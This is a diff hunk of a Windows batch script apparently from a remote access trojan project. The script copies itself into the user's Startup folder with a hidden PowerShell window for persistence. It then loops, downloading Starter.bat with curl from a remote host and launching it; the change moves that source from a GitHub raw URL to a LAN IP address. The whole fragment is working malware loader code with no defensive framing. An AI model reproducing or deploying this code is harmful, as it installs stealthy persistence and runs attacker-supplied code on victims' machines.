@@ -7,7 +7,7 @@ cd %targetd%
 powershell -windowstyle hidden copy "%~f0" "C:\Users\saif\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\init.bat"
 
 :LOOP
-powershell powershell.exe  -windowstyle hidden "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
+powershell powershell.exe  -windowstyle hidden "curl http://192.168.1.9:9000/Starter.bat -o Starter.bat"
 
 if %errorlevel% equ 0 (
   start "" Starter.bat
